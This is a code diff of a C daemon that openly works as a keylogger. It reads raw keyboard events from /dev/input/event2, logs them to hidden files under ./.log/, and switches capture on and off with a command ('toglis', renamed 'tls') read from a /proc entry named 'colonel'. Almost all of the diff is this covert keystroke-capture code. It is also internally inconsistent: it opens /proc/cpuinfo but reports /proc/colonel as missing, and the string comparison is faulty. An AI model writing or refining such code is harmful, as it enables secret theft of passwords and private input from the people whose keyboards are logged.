@@ -21,10 +21,11 @@ int main(void) {
 	FILE *fp = NULL;
 	FILE *evlog;
 	FILE *ftty;
-	struct utsname unameData;
-	uname(&unameData);
+	// int ftty;
 	int fd;
 	int dir;
+	struct utsname unameData;
+	uname(&unameData);
 	char listening = 0;
 	char cmd[10];
 	// struct proc_dir_entry *col_cmd;
@@ -65,7 +66,7 @@ int main(void) {
 	fp = fopen("./.log/.log.txt", "a+"); 		/* daemon log */
 	evlog = fopen("./.log/.evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
-	ftty = fopen("/proc/colonel","r");			/* will act as pseudo terminal */
+	ftty = fopen("/proc/cpuinfo","r");			/* will act as pseudo terminal */
 	if (!ftty) {
 		fprintf(fp, "%s -- ERROR: /proc/colonel not found", ctime(&curtime));
 		return 1;
@@ -98,25 +99,13 @@ int main(void) {
 		// if ('\n' == cmd[len]) {			/* strips newline */
 		// 	cmd[len] = 0;
 		// }
-		if (!strncmp(cmd, "toglis", sizeof(strlen(cmd)))) {
+		if (!strncmp(cmd, "tls", sizeof(strlen(cmd)))) {
 			listening = !listening;
+			fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
 		}
 	}
 
-
-
-	// read(ftty, &col_cmd, sizeof(struct proc_dir_entry));
-	// if ("toglis" == col_cmd.)
-
-
-// int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
-// 		if (!strncmp(buff, "toglis", MAX(6, count))) {		/*toggles listening -- turn the keylogger on/off */
-// 			listening = !listening;
-		
-// 	    return count;
-// 	}
-
-
+	/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: up, 1: down)*/
 	while(1) {
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));
